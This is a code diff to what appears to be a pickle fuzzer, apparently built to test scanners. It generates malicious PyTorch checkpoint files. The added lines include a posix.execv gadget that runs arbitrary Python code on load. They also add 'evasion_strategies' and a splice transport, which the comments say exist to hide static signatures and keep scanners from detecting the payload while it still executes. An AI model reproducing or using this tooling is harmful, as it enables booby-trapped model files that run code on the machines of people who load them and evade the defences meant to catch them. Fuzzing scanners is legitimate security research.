@@ -20,6 +20,33 @@ from pipeline.registry import get_armable_entries, is_dangerous
 from pipeline.templates import inject_payload_into_torch
 
 
+def _structurally_sane(pkl_bytes: bytes) -> bool:
+    """Reject stream-fusion artifacts before they reach scanners.
+
+    A well-formed single-object pickle has at most one PROTO header (leading)
+    and exactly one terminal STOP. Metadata mutation over stacked/fused
+    content can produce mid-stream ``\\x80`` headers whose bodies then
+    desynchronize operand parsing downstream (split find_class operands,
+    swallowed delimiters). Those candidates can never load; catching them
+    here lets callers resample instead of burning scan budget.
+    """
+    try:
+        parsed = parse_pickle(pkl_bytes)
+    except Exception:
+        return False
+    if not parsed or parsed[-1][0].name != "STOP":
+        return False
+    if sum(1 for op, _ in parsed if op.name == "STOP") != 1:
+        return False
+    proto_positions = [i for i, (op, _a) in enumerate(parsed) if op.name == "PROTO"]
+    if proto_positions and (len(proto_positions) > 1 or proto_positions[0] != 0):
+        return False
+    frame_positions = [i for i, (op, _a) in enumerate(parsed) if op.name == "FRAME"]
+    if frame_positions and frame_positions != [1]:
+        return False
+    return True
+
+
 class CandidateGenerator:
     """Fuzzer candidate generator implementing PickleFuzzer mutation and injection."""
 
@@ -174,6 +201,9 @@ class CandidateGenerator:
             args = (expr_payload,)
         elif module == "numpy.testing._private.utils" and name == "runstring":
             args = (payload_code, {})
+        elif module == "posix" and name == "execv":
+            # execv(path, argv): run python3 with -c so the payload executes.
+            args = ("/usr/bin/env", ("python3", "-c", payload_code))
         elif module == "runpy" and name == "run_module":
             # run_module(name) cannot execute arbitrary inline code via a module
             # name; skip these candidates entirely so validity stays meaningful.
@@ -213,6 +243,8 @@ class CandidateGenerator:
         arg_fuzz_prob: float = 0.0,
         stack_prob: float = 0.0,
         attack_family: str = "gadget",
+        evasion_strategies: list[str] | None = None,
+        injection_transport: str | None = None,
     ) -> bytes:
         """Inject a mutated pickle payload into a PyTorch checkpoint file.
 
@@ -230,7 +262,14 @@ class CandidateGenerator:
           ``"gadget"`` (default) is the dangerous-callable GLOBAL/REDUCE
           injection; ``"overwritten"`` / ``"pypi_injected"`` / ``"external"``
           build a self-contained ShadowPickle-family stream via
-          :mod:`pipeline.templates` (see ``FAMILY_LABELS``).
+          :mod:`pipeline.templates` (see ``FAMILY_LABELS``); ``"indirect_chain"``
+          resolves the sink through a benign builtins chain (Phase 1 stealth).
+        * ``evasion_strategies`` (Phase 1) names post-processing strategies
+          from :mod:`pipeline.evasion` applied to the malicious stream before
+          torch injection, hiding static signatures while preserving execution.
+          When active, the torch injection transport defaults to ``splice``
+          (raw opcode splice, no ``_pickle.loads`` wrapper) instead of the
+          legacy loads-wrap; override with ``injection_transport``.
 
         Raises ``ValueError`` when the callable cannot carry an inline payload
         (e.g. ``runpy.run_module``) or when mutation produces an unparseable
@@ -299,6 +338,35 @@ class CandidateGenerator:
                 raise ValueError(f"unknown attack_family: {attack_family}")
             malicious_pkl = template.generate_pickle_payload(payload_code)
 
+        # Phase-1 evasion pipeline: hide static signatures post-construction
+        # (strategies preserve execution semantics; see tests/test_evasion.py).
+        if evasion_strategies:
+            from pipeline.evasion import apply_pipeline
+            malicious_pkl = apply_pipeline(malicious_pkl, evasion_strategies)
+
+        # Self-check BEFORE the stacking trailer: fused/corrupt streams waste
+        # scan budget (they can never load); resample metadata mutation a
+        # bounded number of times before giving up so callers see a clean
+        # ValueError. The trailer itself is pickle.dumps output and is exempt.
+        for _attempt in range(3):
+            if _structurally_sane(malicious_pkl):
+                break
+            if attack_family != "gadget":
+                break  # template families are deterministic; retry won't help
+            malicious_pkl = self.mutate_pickle_bytes(
+                pkl_bytes=base_pkl,
+                payload_code=payload_code,
+                dangerous_callable=dangerous_callable,
+                mutate_meta=mutate_meta,
+                mutation_prob=mutation_prob,
+            )
+            if evasion_strategies:
+                from pipeline.evasion import apply_pipeline
+                malicious_pkl = apply_pipeline(malicious_pkl, evasion_strategies)
+        else:
+            raise ValueError("candidate generation produced structurally "
+                             "invalid stream after retries")
+
         # Structural stacking: an independent trailing pickle after the payload's
         # STOP. torch.load returns the first object and ignores the trailer, so
         # validity and payload execution are preserved.
@@ -311,9 +379,15 @@ class CandidateGenerator:
             in_path = f_in.name
             
         out_path = in_path + ".out.pt"
-        
+
+        # Transport choice: explicit arg wins; otherwise splice whenever the
+        # evasion pipeline is active so the legacy loads-wrap signature
+        # (global:_pickle.loads) never re-introduces detection.
+        transport = injection_transport or ("splice" if evasion_strategies else "loads")
+
         try:
-            inject_payload_into_torch(in_path, out_path, malicious_pkl)
+            inject_payload_into_torch(in_path, out_path, malicious_pkl,
+                                      transport=transport)
             with open(out_path, "rb") as f_out:
                 result_bytes = f_out.read()
         finally:
